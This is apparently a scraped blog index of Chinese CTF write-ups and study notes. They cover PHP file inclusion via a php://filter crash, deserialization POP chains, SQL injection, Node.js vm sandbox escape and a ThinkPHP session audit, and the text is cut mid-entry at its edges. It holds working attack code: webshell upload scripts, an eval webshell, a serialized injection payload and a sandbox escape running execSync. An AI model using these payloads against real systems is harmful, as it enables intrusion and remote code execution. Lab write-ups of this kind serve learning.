type=&quot;text/javascript&quot;&gt; window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;&lt;?php$file=$_GET['file'];if(preg_match('/data|input|zip/is',$file)){ die('nonono');}@include($file);echo 'include($_GET[&quot;file&quot;])';?&gt;&lt;/body&gt;&lt;/htmlPgo 过滤了data和input不能用命令执行了，也不能直接写入文件 PHP7.0bugphp7.0的bug： ?file=php://filter/string.strip_tags/resource=/etc/passwd 使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这个崩溃原因是存在一处空指针引用。 该方法仅适用于以下php7版本，php5并不存在该崩溃。 • php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复 import requests##BytesIO实现了在内存中读写bytesfrom io import BytesIOimport repayload = &quot;&lt;?php eval($_POST[a]);?&gt;&quot;#BytesIO(payload.encode()).getvalue()data={ 'file': BytesIO(payload.encode())}url=&quot;http://a06f9704-b58f-4b3a-b85c-5ad42d0b8833.node4.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r=requests.post(url=url,files=data,allow_redirects=False)except: print(&quot;fail!&quot;) python运行脚本即可，然后读dir.php中看一下文件名，接下来使用文件包含即可","link":"/2021/07/10/buuctf21/"},{"title":"thinkphpv6.0代码审计","text":"前言正好做到一题thinkphp框架漏洞，于是决定自己审计一番~，正好学学如何入门 代码审计两种方式1**.通读全文源码**2.功能点审计：根据漏洞对应发生函数进行功能行审计，常会用到逆向溯源数据流方法进行审计3.正向追踪数据流：根据用户输入参数-&gt;来到代码逻辑-&gt;最后审计代码逻辑缺陷-&gt;尝试构造payload4.逆向溯源数据流:字符串搜索指定操作函数_跟踪函数可控参数-&gt;审计代码逻辑缺陷-&gt;尝试构造payloadCMS可分为两大类单入口cms:不管访问哪个模块都使用同一个入口文件，常见的MVC框架采用这种模式多入口cms:每个模块都有一个入口文件(可以前端设置一个入口文件 index.php，后端创建一个入口文件admin.php，前后端的入口文件是独立的)。 代码审计思路接下来我们从三个层次开始我们的源码审计思路 1.确定要审计的源码是什么语言 2.确定该源码是单入口还是多入口 3.确定该语言的各种漏洞诞生的函数 PHP核心配置一个漏洞在不同环境造成的结果也是不一样的。 由于关于php.ini配置的内容过于多，这里推荐浏览官方文档 https://www.php.net/manual/zh/ini.php，我们在这里主要列下php.ini 主要使用的安全配置。 safe_mode = off 用来限制文档的存取,限制环境变量的存取,控制外部程序的执行.PHP5.4.0移除。 限制环境变量存取safe_mode_allowed_env_vars = string 指定php程序可以改变的环境变量的前缀,当这个选项的值为空时,那么php可以改变任何环境变量,如果 如:safe_mode_allowed_env_vars = PHP_,当这个选项的值为空时,那么php可以改变任何环境变量。 外部程序执行目录safe_mode_exec_dir = &quot;/usr/local/bin&quot; 当安全模式被激活，safe_mode_exec_dir参数限制通过exec()函数执行的可执行文件到指定的目录。举例来说，如果你想限制在/usr/local/bin目录执行功能，你可以使用这个指令： safe_mode_exec_dir = “/usr/local/bin” 禁用函数 disable_functions 为了更安全的运行PHP,可以用此指令来禁止一些敏感函数的使用,当你想用本指令禁止一些危险函数时,切记把dl()函数也加到禁止列表,攻击者可以利用dl()函数加载自定义的php扩展突破disable_functions.配置禁止函数时可以使用逗号分隔函数名。 COM组件com.allow_dcom = false PHP设置在安全模式下(safe_mode),仍允许攻击者使用COM()函数来创建系统组件来还行任意命令,推荐关闭这个函数。 使用COM()函数需要在PHP.ini中配置extension=php_com_dotnet.dll,如果PHPversion&lt;5.4.5则不需要。 全局变量注册开关register_globals = off php.ini的register_globals选项的默认值为OFF,在4.2版本之前是默认开启的,当设定为On时,程序可以接收来自服务器的各种环境变量,包括表单提交的变量,这是对服务器分厂不安全的, register_globals = off时,服务器端获取数据的时候用$_GET[‘name’]来获取数据。 register_globals = on时,服务端使用POST或GET提交的变量,豆浆自动使用全局变量的值来接受。 魔术引号自动过滤magic_quotes_gpc = on PHP5.4.0被移除 magic_quotes_gpc = off 在php.ini中默认是关闭的,如果打开它,将自动把用户提交对sql的查询的语句进行转换,如果设置成ON,php会把所有的单引号,双引号,和反斜杠和空字符(NULL)加上反斜杠()进行转义 它会影响HTTP请求的数据(GET,POST.COOKIE),开启它会提高网站的安全性。 是否允许包含远程文件allow_url_include = off 该配置为ON的情况下,可以直接包含远程文件,若包含的变量为可控的情况下,可以直接控制变量来执行PHP代码。 是否允许打开远程文件allow_url_open = on 允许本地PHP文件通过调用url重写来打开或者关闭写权限,默认的封装协议提供的ftp和http协议来访问文件。 HTTP头部版本信息expose_php = off 防止通过http头泄漏php版本信息。 文件上传临时目录upload_tmp_dir = 上传文件临时保存的目录,如果不设置的话,则采用系统的临时目录。 用户可访问目录open_basedir = D:\\WWW 能够控制PHP脚本只能访问指定的目录,这样能够避免PHP脚本访问不应该访问的文件,一定程度上限制了。webshell的危害 内部错误选项display_errors = on 表明实现PHP脚本的内部错误,网站发布后建议关不PHP的错误回显。 错误报告级别error_reporting(E_ALL &amp; ~Enotice) 具体列表推荐：https://www.runoob.com/php/func-error-reporting.html 这里设置的作用是将错误级别调到最高,显示所有问题,方便环境部署时候排错。 环境配置人生建议，一定要安装phpstudy的集成环境–更改配置的根目录为www(5)的web目录修改为www/web/目录打开即可，接下来去配置一下数据库 去config中的database.php修改一下配置信息，然后去mysql中创建一下表 create database ctf; 但是他的很多表和库的信息我们都不清楚–。。。。所以还是老老实实重新安装整个框架了。。https://www.kancloud.cn/manual/thinkphp6_0/1037481这里降级的时候一直没弄好，不懂是为啥，用了其他的安装和降级指令才行 composer create-project topthink/think tp60 修改composer.json里面的”topthink/frameword”为6.0.0 去掉前面你的注释符，开启session 然后更改apache的根目录为框架里面的public目录 创建成功： 果然最难的就是环境的配置-- 接下来修改一下:tp60\\app\\controller\\的index.php文件使他可以创建session 漏洞原理根据漏洞描述，是因为session可控，传入的session值最后会拼接在sess_后形成任意文件读取覆盖，所以这里我们就直接跟进session值的传入。进入session.php观察如何进行文件写入 跟进以后发现无过滤，只要长度符合32位就对sessionID进行赋值 接下来进行save()函数进行session的保存，可以看到write函数，将data写入sessionID中 将sessionid和sess_进行拼接形成新的文件名存放在/runtime/session/路径中 将传入的data值，写入改session文件中 但是由于我网站根目录设置的是public，懒得再弄了，被配置环境弄怕了– 小结啊 无语了，想说换成phpstudy继承的，但是发现没有适合的php版本于是就又换了回去，期间debug的更换配置也是让人很头疼，最后瞎配置 也总算是配置好了–，真的是有点傻了说一下第一次审计的收获1.使用ctrl加鼠标左键可以直接看该函数的出现的位置2.可以右键单击某个值添加观察追踪其改变位置3.根据出问题的功能追踪其功能","link":"/2021/07/15/thinkphpv6-0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"title":"node.js沙盒逃逸分析","text":"背景在日常开发中，会在业务代码中直接使用eval/function/vm等功能，其中 eval/Function 算是动态执行 JS，但无法屏蔽当前执行环境的上下文，但node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。 沙盒简介沙盒的特点在于很好的系统隔离性，在某种程度上，沙盒sandbox可以视为一个容器container，application运行在沙盒中，沙盒运行在windows操作系统上运行在沙盒中的application和沙盒外的application一样可以访问硬盘中的文件等资源。运行在沙盒中的application和沙盒外的application的主要区别在于： 对于沙盒外的application而言，沙盒内的application是透明的（即不可见的）； 当沙盒内的application退出后，所做的更改将不会被保存。 一个很好的例子是：当沙盒内的application退出后，沙盒内的application已下载或“安装”的恶意软件都将被丢弃。 总而言之，沙盒就是一个可以让你相对安全执行代码的环境 沙盒逃逸首先来一段沙盒逃逸的实例，直接进行分析： const vm = require('vm');const ctx = {};vm.runInNewContext('this.constructor.constructor(&quot;return process&quot;)().exit()', ctx);//vm.runInNewContext是编译和运行里面的javascript代码，其中的ctx似乎是可控的，而this指向了ctxconsole.log('Never gets executed.'); 以上事例大致可以拆分出: tmp=ctx.constructor//objectexec=tmp.constructor//Functionexec('return Process') 以上被称为原型链的方式完成逃逸，个人感觉可以和继承的思想联系在一起，有点类似但是又不同，大概是通过往前引用原型链，引用到沙箱外的函数，从而实现逃逸。 原理 根据这个图片进行讲解，就是在vm上下文通过原型链的prototype属性向上链接引用function，引用到全局数据实现在沙盒内进行沙盒外的function的调用。 实例分析const vm = require('vm');const context = { animal: 'cat', count: 2};const script = new vm.Script(`this`);vm.createContext(context);var result = script.runInContext(context);console.log(result.Function == Function); //false 其中this通过其__proto__属性指向的是主环境的Object.prototype，所以: this.constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami').toString() 1.通过this的原型链向上获得主环境的function2.然后通过(‘return process’)()获得主环境process变量3通过process.mainModule.require导入child_process模块，实现命令执行 知识补充process变量：是nodejs中的一个全局变量，拿到这个环境变量，相当于此时是在主环境下进行函数的执行，类似偷梁换柱？ child_process模块：提供了命令执行的方法 http://nodejs.cn/api/child_process.html#child_process_child_processhttps://chinese.freecodecamp.org/forum/t/topic/587https://liotree.github.io/2020/04/29/vm2%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/","link":"/2021/07/13/node-js%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/"},{"title":"论js的对象","text":"前言发现学习node.js的沙盒逃逸时，对象的概念也需要理解一下。 什么是jsjs就是javascript，js里面一切皆对象，理解对象是理解js语言的关键 封装、继承、多态在C++/Java等传统面向对象编程中，类（class）是对象（object）的模板，class不占用内存空间，object占用内存，object也称为class instance，同一个class可以被new出很多个object。 Javascript语言不支持”类”，但Javascript仍然是面向对象语言，面向对象的3要素在JavaScript里都支持: 封装 - 数据与方法封装在一起，方法可以操作数据，这就是JS里的object 继承 - 新创建的对象可以继承父对象的数据和方法，js里有多种方法实现继承，譬如原型方式继承，拷贝继承等 多态 - 一个接口有多种实现 实际上，js里一切皆对象。 什么是对象js里的对象（object）就是一组键值(name-value)的集合, name总是string类型, value可以是各种类型, 可以是基本数据类型, 可以是数组或其他对象, 也可以是函数, object很像是一个hash map. object里的name-value是无序的。 对象是动态的，可以动态地增加属性和方法。 对象属性属性特性每个属性都拥有4个特性，数据属性和访问器属性一共有6种属性特性: 数据属性特有的特性: [[Value]]: 属性的值. [[Writable]]: 控制属性的值是否可以改变. 访问器属性特有的特性: [[Get]]: 存储着getter方法. [[Set]]: 存储着setter方法. 两种属性都有的特性: [[Enumerable]]: 如果一个属性是不可枚举的,则在一些操作下,这个属性是不可见的,比如for…in和Object.keys() [[Configurable]]: 如果一个属性是不可配置的,则该属性的所有特性(除了%%[[Value]]%%)都不可改变 对象的原型[[prototype]]在js中所有对象都有一个隐含的属性[[prototype]]指向其原型对象，原型对象也有自己的原型，如此下去便形成一个原型链，所有对象的原型链的顶层都是Object.prototype. 请注意，[[prototype]]并不是一个真实的属性名，因此无法通过这个属性名获得原型对象，但js提供了方法来读取和判断对象的原型: // 接前面的例子console.log(Object.getPrototypeOf(myFather) === Person.prototype); //trueconsole.log(Person.prototype.isPrototypeOf(myFather)); //trueconsole.log(Person.prototype.isPrototypeOf(myMother)); //false 对象的原型链通常是只读的，用户无法修改某个对象的原型，所以无法修改对象的继承关系。 属性proto在js规范里，对象原型通常是不可见的属性，因此无法直接访问。但某些浏览器里支持__proto__属性，firefox/chrome/safari/nodejs都支持__proto__属性，在这些浏览器里对象原型是可见的，可以直接访问对象的__proto__属性得到对象原型，也可以通过修改对象的__proto__属性来修改对象的原型链。 ECMAScript 6正在讨论把__proto__属性标准化，但目前属性__proto__还不是标准。 本文接下来提到的__proto__, [[prototype]]都是指一个意思，即自身对象里指向其原型对象的属性。 prototype函数也是对象，所以函数也有属性__proto__，通过字面量声明的函数其原型对象是Function.prototype，当然Function.prototype的原型对象是Object.prototype. 函数还有一个特有的属性prototype，每个函数都有一个prototype属性（特别注意，prototype属性是函数对象特有的属性，不要和js中每个对象到其原型的连接相混淆，那个是隐藏的，只是在firefox/chrome等浏览器中你可以使用__proto__访问到） constructorObject.prototype.constructor返回创建实例对象的 Object 构造函数的引用。注意，此属性的值是对函数本身的引用，而不是一个包含函数名称的字符串。对原始类型来说，如1，true和&quot;test&quot;，该值只可读。 详情所有对象都会从它的原型上继承一个constructor属性: var o = {};o.constructor === Object; // true 示例:function Tree(name){this.name=name;}var theTree=new Tree(&quot;Redwood&quot;);console.log(&quot;theTree.constructor is &quot;+the Tree.constructor);//打印输出theTree.constructor is function Tree(name) { this.name = name;} 小结大概整理一下js的对象的一些基础概念，1.每个对象都有[[prototype]]属性，是用来指向自己的原型对象2.所有对象的[[prototype]]是_proto_，而函数有一个特有的属性是prototype3.prototype有个属性是constructor指向其原型对象的，可以进行调用。","link":"/2021/07/13/%E8%AE%BAjs%E7%9A%84%E5%AF%B9%E8%B1%A1/"},{"title":"2019强网杯upload","text":"[强网杯 2019]Uploadwww.tar.gz有他的源码，注册以后发现可以文件上传，审计一下他的文件上传功能：将上传的文件的后缀更改为png 然后使用getimagesize检查文件头是否为图片 文件上传这里似乎没有太多机会，可能需要哪里辅助一下这里有个反序列化函数，可以对profile进行赋值 底下有两个魔术方法: get：读取不可访问或不存在的属性时调用 call：调用不可访问或不存在的方法时调用 看了一下其他地方发现有个destruct方法 思路整理1.文件上传的限制在于后缀名会被强制更改为png2.可以对cookie的值进行反序列化，会触发get、call魔术方法调用不存在的属性和方法对profile进行重新赋值操作3.如何将profile和更换文件后缀联系在一起呢？——————————————————————我们可以看到在upload_img()函数中有一个copy函数，将filename_tmp的值赋给了filename。那么思路就是这样：1.先上传一个图片马2.然后通过cookie传入反序列化内容，其中反序列化的思路应该是这样的:为了使用call和get方法，所以我们要调用没有的属性和方法，profile.php中没有register中的方法，所以这里就可以先写一波: $registed=new Register();$registed-&gt;registed=false;$registed-&gt;checker=$profiled; 接下来就会调用profile里面的get和call方法:首先会调用call方法因为index方法不存在再profile类里面，因为我们的目的是利用call方法调用upload_img()，所以我们需要利用get方法对name赋值，由于get是调用不存在的属性，所以我们这里依旧是利用index来作为一个跳板置换成upload_img(),然后有几个判断是我们需要绕过的，其中包括检查ext是否为png $profiled=new Profile();$profiled-&gt;except=['index'=&gt;'upload_img'];$profiled-&gt;ext=&quot;png&quot;;$profiled-&gt;filename=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;;$profiled-&gt;filename_tmp=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;; 完整的poc如下 &lt;?phpclass Profile{ public $checker; public $filename_tmp; public $filename; public $upload_menu; public $ext; public $img; public $except; public function __get($name) { return $this-&gt;except[$name]; } public function __call($name, $arguments) { if ($this-&gt;{$name}) { $this-&gt;{$this-&gt;{$name}}($arguments); } }} class Register{ public $checker; public $registed; public function __destruct() { if(!$this-&gt;registed){ $this-&gt;checker-&gt;index(); } } }$profiled=new Profile();$profiled-&gt;except=['index'=&gt;'upload_img'];$profiled-&gt;ext=&quot;png&quot;;$profiled-&gt;filename=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8111.php&quot;;$profiled-&gt;filename_tmp=&quot;/upload/7792cab172a46cd0ff2d8d7fae734ba2/8383c2ba7b9a26c39fbe4c61bf398ed4.php&quot;;$registed=new Register();$registed-&gt;registed= false;$registed-&gt;checker=$profiled;echo urlencode(base64_encode(serialize($registed)));?&gt; 这是我在本地构建的，将所有用到的类整合到一个文件里面，方便进行调试查看赋值过程，否则还需要在开头再加上: namespace app\\web\\controller;error_reporting(0); 将序列化后的内容使用cookie传入即可，前提是先上传一个文件马","link":"/2021/07/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFupload/"},{"title":"sql注入复习","text":"前言最近做到sql注入的题目，都没有很敏感了，于是决定要重新复习一下 sql注入原理源码对用户的输入的内容没有进行很好的过滤机制，导致用户输入的内容拼接到sql语句，影响原本sql语句的功能 sql注入种类：回显注入顾名思义，就是输入内容会有回显，我们可以通过回显内容判断是否成功过滤 ?id=1'and 1=1'1?id=-1'union select database()--+ #union还需要注意一下字段数 报错注入数据溢出：就是超过mysql的数据范围会报错：但是又版本限制：&lt;=5.5.4的三皈依出金额图将报错内容显示出来 主键重复//数据库select * from user where 1=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a);//表名select * from user where 1=1 and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//字段select * from user where 1=1 and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name='user' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);//值select * from user where 1=1 and (select 1 from (select count(*),concat((select id from user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a); 列名重复这个可以用在无列名注入的时候，爆出列名 mysql&gt; select * from (select * from user a join user b)c;ERROR 1060 (42S21): Duplicate column name 'id'mysql&gt; select * from (select * from user a join user b using(id))c;ERROR 1060 (42S21): Duplicate column name 'username' xpath语法报错注入利用extractvalue或者updatexml 一些特性注入宽字节注入看数据库编码是否发生改变 无列名注入select 1,2 union select * from user; 二次注入第一次插入数据库的数据被过滤，但是在下一次使用拼凑过程中以输入的形式进行组合，造成语句恶意拼接 [网鼎杯2018]Unfinish注册以后发现用户名显示了,猜测语句是 insert into XXX ('','','') values ('','''',''); 所以构造一下注入语句为： xxxxxxxxxx insert into XXX (email,username,passwd) values ('',''+(select hex(database()))+'',''); 在这里我们是使用+号这个运算符作为连接符查询结果可以理解为: 0+database()+0 但是如果直接这样相加 是没有回显的，因为字母+数字在mysql里面加不了为0所以要转化为十六进制，使用hex函数，但是经过测试，有的字符串只经过一次hex还是有字母，毕竟是十六进制~:所以要经过两次十六进制的转换 接下来是构造语句: username='+(select hex(hex(database())))+' 经过两次hex解码，得知数据库名为web information又被过滤了--，这个时候就直接猜表名为flag就好了~ 发现会有科学计数法e的存在，所以会损失精度，所以需要用substr截取 这里学到了一个新姿势，就是substr from for 因为是逗号的时候会报错-- username=0'+(select substr(hex(hex((select * from flag))) from 1 for 10))+'0 位数很多 需要使用脚本，脚本编写思路如下：先在register注册账号，然后用login登录查询 import requestsimport reurl='http://707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn/register.php'for i in range(0,20): # data={ # &quot;email&quot;:str(i)+'@qq.com', # &quot;username&quot;:&quot;'+substr(hex(hex((select * from flag))) from &quot;+str(i*10+1)+&quot; for 10)+'&quot;, # &quot;password&quot;:&quot;1&quot; # } # r=requests.post(url=url,data=data) url2 = 'http://707e6b02-6d3d-4527-8899-ab194079ea88.node4.buuoj.cn/login.php' data={ &quot;email&quot;:str(i)+'@qq.com', &quot;password&quot;:&quot;1&quot; } r=requests.post(url=url2,data=data,allow_redirects=True) print (re.findall(&quot;.*?&lt;/span&gt;&quot;,r.text)[0].replace('&lt;/span&gt;','').strip(),end='') 这里我是先批量注册，然后再批量登录通过正则定位编码位置然后组装由于现在buu太容易崩溃惹。。。所以我就0-5获取一次然后5-10获取一下 363636433631363737423631363433383334363133383633333832443631333033353634324433343634333236363244363233343334333132443333363533393338363536353337333036313338363436333744 结果如上，然后hex解码两次即可 python利用正则表达式快速截取定位内容以前就经常在想怎么在一大串的网页回显中截取自己想要的那部分内容，后来看了一下学长的脚本，发现使用正则表达式可以达到这种操作: importe re#引入re库str_txt = &quot;&quot;&quot; if (!mobileVisit) { googletag.defineSlot &quot;div-gpt-ad-15390086850-0&quot;).addService(googletag.pubads()); } &quot;&quot;&quot;comment=re.compile(r'div-gpt-ad-(.*?)-0',re.S)comment1=comment.findall(str_txt)print(comment1[0]) 1.使用re正则表达式中的compile函数，在匹配内容的括号中写（.?）**2.其中.\\?代表非贪心算法，表示精准的配对3.在.*?的外面加个括号表示获取括号之间的信息4.在（.*?）两边加上原文本中要匹配信息两旁的信息，例如要想获得字符串“abcdefg”中的cd，就要在（.*?）里面分别加上ab和efg5.compile中使用的第二个参数是re.S，表示正则表达式会将这个字符串作为一个整体，包括”\\n“，如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始，不会跨行6.compile()函数返回的是一个匹配对象，单独使用无意义，需要和findall()**函数搭配使用，返回的是一个列表———————————————— 参考：https://blog.csdn.net/weixin_44346972/article/details/106746133","link":"/2021/07/17/sql%E6%B3%A8%E5%85%A5%E5%A4%8D%E4%B9%A0/"},{"title":"buu22","text":"[MRCTF2020]Ezaudit随手试了一下www.zip==又有源码了， 前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了 和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1=1’1这里有个大坑，以前没有注意过 这里要求php的版本是要在5.2.1到7.0.x之间的，不然出来的秘钥是不匹配的 [GXYCTF2019]StrongestMind计算成功1000次看起来是要写个脚本改天一定要学学算法，感觉自己写的代码都好冗长，可以去世了，测试是可以的，但是由于现在buu限制了，一下子发送太多请求直接500了，服惹弄了时间间隔也没用，so下一题了 import requestsimport reimport timeurl=&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;s=requests.session()r = s.post(url=url).textr1=''for i in range(0,10000): if i!=0: r=r1 answer1=re.compile(r'&lt;br&gt;&lt;br&gt;\\d{8}',re.S).findall(r)[0].replace('&lt;br&gt;&lt;br&gt;','') answer2=re.compile(r'\\d{8}&lt;br&gt;&lt;br&gt;',re.S).findall(r)[0].replace('&lt;br&gt;&lt;br&gt;','') sign=re.compile(r' \\W ',re.S).findall(r)[0].replace(' ','') answer1=float(answer1) answer2=float(answer2) if '+' == sign: fina_answer=answer1+answer2 else: fina_answer = answer1-answer2 data={ &quot;answer&quot;:fina_answer } r1 = s.post(url=url, data=data).text #print(r1) print('*'*25) if &quot;bingo!&quot; in r1: print(i) time.sleep(0.5) [安洵杯 2019]不是文件上传前置知识做题过程中遇到不熟悉的知识点写在前面比较好 php—foreach理解&lt;?php$arr = [1, 2, 3, 4];foreach($arr as &amp;$value) { $value = $value * 2;}// $arr is now [2, 4, 6, 8]unset($value); // 最后取消掉引用 &lt;?php$arr = [1, 2, 3];foreach ($arr as $k =&gt; &amp;$v) { $v = $v * 2;}//$arr=2 4 6 原题目有文件泄露所以直接上github下载一下源码然后开始审计~：在helper.php中看到一处序列化，其中这个my_ext是图片的大小，即宽度和高度 getfile()方法，存在check机制 严格的白名单检测机制，因为strrchr() 函数（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，这里有个文件读取，但是path似乎被写死了，暂时还没找到利用点继续看一下其他文件，在show.php中看到了显示文件的代码，对attr_temp的内容进行反序列化，前面对它是进行了序列化的 解题思路题目给了反序列化，但是没看到一些有用的跳板，感觉是要结合数据库进行攻击，最后利用file_get_contents得到flag，但是感觉对于那些值可控有点茫然，所以决定传值跟一下首先是数据库配置： create database pic_base 可以发现文件名是可控的并且最后是attr参与反序列化，注意到又包含了helper.php，所以感觉是可以进行config值的更改的 所以思路如下： 首先构造反序列化对config重新赋值，然后通过sql注入使本来应该title的序列化语句跑到attr字段，然后通过访问该图片，即可获得flag构造反序列化语句 class helper{ protected $ifview=True; protected $config=&quot;/flag&quot;;}$a=new helper();echo bin2hex(serialize($a); 然后由于这个是protected 并且题目中对*号做了处理，所以我们对其进行十六进制加密就行了 0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d 然后构造sql注入语句,抓包改文件名 1','1','1','1','0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d')# INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES('12','534b340ce39e1079.jpg','jpg','pic/534b340ce39e1079.jpg','a:2:{s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;}') 成功插入获得flag [SUCTF 2018]GetShellif($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])){ $data=substr($contents,5); foreach ($black_char as $b) { if (stripos($data, $b) !== false){ die(&quot;illegal char&quot;); } } } 看源码，他除了源码的前五位不检查，其他都会和黑名单比对，但是我们不知道过滤了啥，所以需要fuzz一下,顺便学习一下如何编写文件上传的脚本 import requestsurl =r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;s=requests.session()headers = s.get(url).headersdef upload_post(url): str_list=[] for i in range(33,127): str_list.append(chr(i)) for str in str_list: file_post=f&quot;&quot;&quot; -----------------------------380760932532682480232707439734Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;屏幕截图(3).png&quot;Content-Type: image/png12345{str}-----------------------------380760932532682480232707439734Content-Disposition: form-data; name=&quot;submit&quot;提交-----------------------------380760932532682480232707439734-- &quot;&quot;&quot; r=s.post(url,headers=headers,data=file_post.encode('UTF-8')) print(r.text) if 'Stored' in r.text: print(&quot;该字符可以通过: {0}&quot;.format(str)) else: print(&quot;过滤字符: {0}&quot;.format(str))if __name__ == '__main__': upload_post(url) 经过测试可以通过的字符有：$、(、)、.、;、=、[、]、_、~，然后就是汉字了接下里的思路就是思考一下如何构造马去进行上传，如何通过现有字符构造出被过滤的字符，用得一般就是异或操作或者取反，但是异或符号被过滤了，所以这里就用取反去构造 &lt;?php$__ = [];$_ = ($__ == $__);//$_ = 1$__ = ~(融);$___ = $__[$_];print($___);//输出a 通过以上方法我们可以构造出我们需要的字母，接下来写一个fuzz脚本： &lt;?phperror_reporting(0);header('Content-Type: text/html;charset=utf-8');function str_split_unicode($str,$l=0){ if($l&gt;0){ $ret=array(); $len=mb_strlen($str,'UTF-8');//mb_strlen获取长度 for ($i = 0; $i &lt; $len; $i += $l) { $ret[] = mb_substr($str, $i, $l, &quot;UTF-8&quot;); } return $ret; } return preg_split(&quot;//u&quot;, $str, -1, PREG_SPLIT_NO_EMPTY);//preg_split — 通过一个正则表达式分隔字符串，返回汉字}$s = '放你的汉字要多一点才行';$arr_str=str_split_unicode($s);for ($i=0; $i &lt; strlen($s) ; $i++) { echo $arr_str[$i].' ------- '.~$arr_str[$i][1].'&lt;br&gt;';} 接下来构造马： &lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]); POST:a=env 然后访问环境变量就可以看到flag了，为啥是环境变量=-=，好像是题目出了问题，本来在根目录的，","link":"/2021/07/22/buu22/"},{"title":"lctf babyphp&#39;s revenge","text":"php中session反序列化机制简介session中有关序列化配置： session.serialize_handler=php 表明session的默认序列话引擎使用的是php序列话引擎 session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 例： \u0004names:6:&quot;spoock&quot;; name|s:6:&quot;spoock&quot;;其中name是键值，s:6:”spoock”是反序列化的结果 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值例：a:1:{s:4:&quot;name&quot;;s:6:&quot;spoock&quot;}对一整个name=spoock进行序列化存储 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 例： name|s:6:&quot;spoock&quot;;其中name是键值，s:6:”spoock”是反序列化的结果 在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set('session.serialize_handler', '需要设置的引擎');。示例代码如下： &lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something 存储机制php中的session内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 session反序列化利用session序列化的危害主要来自于不同存储引擎的解析存储方法不同，如果对同一组输入值进行不同的解析方式，那么就会产生风险。例: $_SESSION['ryat'] = '|O:11:&quot;PeopleClass&quot;:0:{}'; 上述session使用的是php_serialize，所以最后的存储内容是 a:1:{s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:{}&quot;;} 但是如果我们在读取的过程中选择PHP，那么就会变成 array (size=1) 'a:1:{s:6:&quot;spoock&quot;;s:24:&quot;' =&gt; object(__PHP_Incomplete_Class)[1] public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11) 也就是PeopClass这个类也会在反序列化读取中被执行这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将a:1:{s:6:&quot;spoock&quot;;s:24:&quot;作为SESSION的key，将O:11:&quot;PeopleClass&quot;:0:{}作为value，然后进行反序列化，最后就会得到PeopleClas这个类。这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 lctf-bestphp’s revengeSOAP简介SOAP（Simple Object Access Protocol）是一种在 web service 通信时所用的基于 xml 的协议。可以用来修改报文，以及修改访问的目标的iphttps://wooyun.js.org/drops/Trying%20to%20hack%20Redis%20via%20HTTP%20requests.html 看题目：flag.php only localhost can get flag!session_start();echo 'only localhost can get flag!';$flag = 'LCTF{*************************}';if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;){ $_SESSION['flag'] = $flag; }only 